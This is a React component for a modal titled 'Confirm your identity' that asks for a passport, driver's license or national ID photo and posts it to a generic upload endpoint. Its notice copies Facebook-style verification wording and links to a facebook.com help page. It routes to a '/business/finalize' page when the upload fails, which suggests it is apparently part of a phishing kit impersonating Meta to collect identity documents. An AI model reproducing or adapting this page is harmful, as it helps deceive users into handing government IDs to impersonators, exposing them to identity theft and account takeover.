import { faClose } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import React, { useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';

interface ImageUploadProps {
    onClose: () => void;
}

const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
    const fileInputRef = useRef<HTMLInputElement | null>(null);
    const [uploading, setUploading] = useState(false);
    const navigate = useNavigate();
    const handleFileChange = async (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files ? event.target.files[0] : null;

        if (file) {
            setUploading(true);

            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch('/upload-endpoint', {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('ok');
                } else {
                    navigate('/business/finalize');
                }
            } catch (error) {
                console.error('Error uploading image:', error);
            } finally {
                setUploading(false);
                if (fileInputRef.current) {
                    fileInputRef.current.value = '';
                    const event = new Event('change', { bubbles: true });
                    fileInputRef.current.dispatchEvent(event);
                }
            }
        }
    };


    const handleButtonClick = () => {
        if (fileInputRef.current && !uploading) {
            fileInputRef.current.click();
        }
    };

    return (
        <div className="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-75">
            <div className="bg-white p-8 rounded-lg shadow-2xl w-11/12 md:w-2/5">
                <div className="relative flex items-center justify-center mb-4">
                    <h2 className="text-xl font-semibold text-gray-800">Confirm your identity</h2>
                    <FontAwesomeIcon
                        icon={faClose}
                        className="bg-gray-200 hidden md:block p-2 rounded-full w-5 h-5 absolute right-0 top-1/2 transform -translate-y-1/2 cursor-pointer hover:bg-gray-300 text-gray-600"
                        onClick={onClose}
                    />
                </div>
                <hr className="my-4 border-gray-300" />
                <div className="mb-4">
                    <b className="text-lg text-gray-700">Choose type of ID to upload</b>
                    <p className="text-gray-600 mt-2">We’ll use your ID to review your name, photo, and date of birth. It won’t be shared on your profile.</p>
                </div>
                <div className="w-full mb-4 text-gray-700 font-semibold">
                    <label htmlFor="passport" className="flex items-center justify-between mb-2 hover:bg-gray-200 p-2 cursor-pointer">
                        <span>Passport</span>
                        <input
                            type="radio"
                            id="passport"
                            name="document"
                            value="passport"
                            defaultChecked
                            className="ring-1 rounded-full checked:ring-blue-500 checked:border-white checked:border-2 checked:ring-2 checked:bg-blue-600 ring-gray-500 h-4 w-4 text-blue-600"
                        />
                    </label>
                    <label htmlFor="drivers-license" className="flex items-center justify-between mb-2 hover:bg-gray-200 p-2 cursor-pointer">
                        <span>Driver's license</span>
                        <input
                            type="radio"
                            id="drivers-license"
                            name="document"
                            value="drivers-license"
                            className="ring-1 ring-gray-500 rounded-full checked:ring-blue-500 checked:border-white checked:border-2 checked:ring-2 checked:bg-blue-600 h-4 w-4 text-blue-600"
                        />
                    </label>
                    <label htmlFor="national-id" className="flex items-center justify-between mb-2 hover:bg-gray-200 p-2 cursor-pointer">
                        <span>National ID card</span>
                        <input
                            type="radio"
                            id="national-id"
                            name="document"
                            value="national-id"
                            className="ring-1 ring-gray-500 rounded-full checked:ring-blue-500 checked:border-white checked:border-2 checked:ring-2 checked:bg-blue-600 h-4 w-4 text-blue-600"
                        />
                    </label>
                </div>

                <input
                    type="file"
                    accept="image/*"
                    capture="environment"
                    ref={fileInputRef}
                    onChange={handleFileChange}
                    className='hidden'
                />
                <div className="text-gray-600 text-sm bg-gray-100 p-4 rounded-md">
                    Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information. <a href="https://www.facebook.com/help/155050237914643/" target='_blank' className="text-blue-600 underline">Learn more</a>
                </div>
                <button
                    className={`bg-blue-500 w-full mt-6 font-semibold text-white px-4 py-2 rounded-md hover:bg-blue-600 ${uploading ? 'opacity-50 cursor-not-allowed' : ''}`}
                    onClick={handleButtonClick}
                    disabled={uploading}
                >
                    {uploading ? 'Uploading...' : 'Upload Image'}
                </button>
            </div>
        </div>
    );
};

export default ImageUpload;
